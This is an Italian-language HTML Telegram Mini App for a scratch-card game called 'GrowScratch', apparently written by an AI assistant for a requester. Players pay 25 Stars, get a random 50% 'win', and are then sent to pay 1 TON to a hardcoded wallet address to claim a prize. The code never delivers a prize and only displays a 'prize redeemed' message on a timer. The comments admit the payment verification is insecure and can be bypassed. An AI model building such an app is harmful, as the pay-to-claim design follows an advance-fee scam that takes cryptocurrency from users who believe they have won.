<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GrowScratch - Gratta e Vinci Premi Reali!</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
        .container { max-width: 400px; margin: 0 auto; background-color: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        .scratch-area { width: 100%; height: 200px; background-color: #ccc; border-radius: 5px; margin: 20px 0; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: bold; color: #333; }
        button { padding: 10px 20px; margin: 10px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        #playButton { background-color: #4CAF50; color: white; }
        #revealButton { background-color: #2196F3; color: white; display: none; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>GrowScratch ‚ú®</h1>
        <p>Gratta e Vinci Premi Reali!</p>

        <div id="infoSection">
            <h2>‚ùì Come Funziona</h2>
            <ul>
                <li>‚≠ê Paga 25 Stars per giocare</li>
                <li>üñ±Ô∏è Gratta il biglietto con il mouse o il dito</li>
                <li>üéÅ Se vinci, paga 1 TON per riscattare il premio</li>
            </ul>
            <button id="playButton">Gioca Ora (25 Stars)</button>
        </div>

        <div id="gameSection" class="hidden">
            <h2>Biglietto</h2>
            <div class="scratch-area" id="scratchArea">
                GRATTA QUI
            </div>
            <p id="resultMessage" class="hidden"></p>
            <button id="revealButton">Riscatta Premio (1 TON)</button>
        </div>

        <div id="paymentSection" class="hidden">
            <h2>Pagamento in corso...</h2>
            <p id="paymentStatus">In attesa di conferma...</p>
        </div>
    </div>

    <script>
        const webApp = window.Telegram.WebApp;
        const playButton = document.getElementById('playButton');
        const revealButton = document.getElementById('revealButton');
        const infoSection = document.getElementById('infoSection');
        const gameSection = document.getElementById('gameSection');
        const paymentSection = document.getElementById('paymentSection');
        const paymentStatus = document.getElementById('paymentStatus');
        const resultMessage = document.getElementById('resultMessage');

        let hasWon = false;

        // 1. Inizializzazione
        webApp.ready();
        webApp.MainButton.hide();

        // Funzione per simulare la vincita/perdita
        function determineWin() {
            // Logica di vincita: 50% di possibilit√† per l'esempio
            hasWon = Math.random() < 0.5;
            resultMessage.textContent = hasWon ? "HAI VINTO! Clicca per riscattare." : "Non hai vinto. Riprova!";
            resultMessage.classList.remove('hidden');
            
            if (hasWon) {
                revealButton.style.display = 'block';
            }
        }

        // Funzione per tornare alla schermata iniziale
        function resetApp() {
            paymentSection.classList.add('hidden');
            gameSection.classList.add('hidden');
            infoSection.classList.remove('hidden');
            revealButton.style.display = 'none';
            resultMessage.classList.add('hidden');
            document.getElementById('scratchArea').textContent = 'GRATTA QUI';
        }

        // --- LOGICA DI PAGAMENTO STARS (25 STARS) ---
        playButton.onclick = () => {
            if (!webApp.isVersionAtLeast('6.0')) {
                webApp.showAlert("La tua versione di Telegram non supporta i pagamenti Stars.");
                return;
            }

            // Nascondi l'interfaccia e mostra lo stato del pagamento
            infoSection.classList.add('hidden');
            paymentSection.classList.remove('hidden');
            paymentStatus.textContent = "Richiesta di pagamento 25 Stars in corso...";
            
            // L'URL dell'invoice DEVE essere generato dal tuo bot/server.
            // Questo √® un placeholder.
            const starsInvoice = "https://t.me/wallet/invoice?startapp=stars_25_invoice_id"; 

            // Apri l'invoice per il pagamento Stars
            webApp.openInvoice(starsInvoice, (status) => {
                // Questa callback viene chiamata quando l'utente chiude l'invoice.
                // Lo stato pu√≤ essere 'paid', 'cancelled', 'failed', 'pending'.

                if (status === 'paid') {
                    // **CORREZIONE DEL BUG PER STARS:**
                    // Il bug qui √® che il frontend si fida del callback `status === 'paid'`.
                    // Per una vera sicurezza, il tuo bot DEVE ricevere un webhook di conferma.
                    // Senza backend, assumiamo il successo e procediamo.
                    
                    paymentStatus.textContent = "Pagamento Stars effettuato. Inizio gioco.";
                    
                    setTimeout(() => {
                        paymentSection.classList.add('hidden');
                        gameSection.classList.remove('hidden');
                        determineWin();
                    }, 2000); 

                } else {
                    paymentStatus.textContent = `Pagamento Stars annullato o fallito (${status}). Riprova.`;
                    setTimeout(resetApp, 3000);
                }
            });
        };

        // --- LOGICA DI PAGAMENTO TON (1 TON) ---
        revealButton.onclick = () => {
            if (!hasWon) return;

            // Nascondi l'interfaccia e mostra lo stato del pagamento
            gameSection.classList.add('hidden');
            paymentSection.classList.remove('hidden');
            paymentStatus.textContent = "Richiesta di pagamento 1 TON in corso...";
            
            // **CORREZIONE PER TON SENZA BACKEND (Wallet Pay Link):**
            // Usiamo openTelegramLink per aprire un link di trasferimento diretto Wallet Pay.
            // Questo √® il modo pi√π vicino alla tua richiesta "solo TMA SDK" per TON.
            const tonWalletAddress = "UQArbhbVEIkN4xSWis30yIrNGdmOTBbiMBduGeNTErPbviyR";
            const tonAmount = "1000000000"; // 1 TON in nanoTON
            
            // Link di trasferimento Wallet Pay
            const walletPayLink = `https://t.me/wallet/transfer?text=GrowScratch_Redeem&amount=${tonAmount}&to=${tonWalletAddress}`;
            
            webApp.openTelegramLink(walletPayLink);
            
            // **PUNTO CRITICO: IL BUG DI SICUREZZA PERSISTE QUI**
            // openTelegramLink NON fornisce un feedback di successo/fallimento.
            // L'utente pu√≤ annullare la transazione ma il codice qui sotto verr√† comunque eseguito.
            
            // **SENZA VERIFICA ON-CHAIN, QUESTO √à IL BUG CHE DEVI ACCETTARE.**
            
            paymentStatus.textContent = "Pagamento TON (simulato) in attesa di verifica...";
            
            setTimeout(() => {
                // Senza verifica on-chain, questo √® il punto in cui il bug si manifesta.
                paymentStatus.textContent = "Verifica TON completata (NON SICURA). Premio riscattato!";
                revealButton.style.display = 'none';
                resultMessage.textContent = "PREMIO RISCATTATO! Controlla i tuoi messaggi.";
                
                setTimeout(resetApp, 3000);
            }, 2000); 
        };

        // Logica di base per il "gratta e vinci" (solo visuale per l'esempio)
        const scratchArea = document.getElementById('scratchArea');
        scratchArea.addEventListener('click', () => {
            scratchArea.style.backgroundColor = '#fff';
            scratchArea.textContent = '*** Risultato Rivelato ***';
        });

    </script>
</body>
</html>
